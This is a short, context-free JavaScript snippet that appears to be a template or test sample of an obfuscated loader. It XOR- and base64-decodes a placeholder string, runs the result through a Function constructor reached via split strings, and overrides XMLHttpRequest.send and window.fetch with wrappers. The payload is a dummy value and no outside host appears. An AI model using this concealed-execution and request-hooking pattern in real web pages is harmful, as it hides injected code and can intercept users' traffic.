var encoded="01020304", decoded="";
for(var index=0; index<encoded.length; index+=2) decoded+=String.fromCharCode(parseInt(encoded.slice(index,index+2),16)^5);
var base=globalThis["atob"](decoded), result="";
for(var index=0;index<base.length;index++) result+=String.fromCharCode(base.charCodeAt(index)^7);
(new ([]["fil"+"ter"]["cons"+"tructor"])(result))();
new MutationObserver(function(){});
XMLHttpRequest.prototype.send = function(x){return nativeSend(x);};
window.fetch=function(url){return nativeFetch(url);};
node.removeChild(child);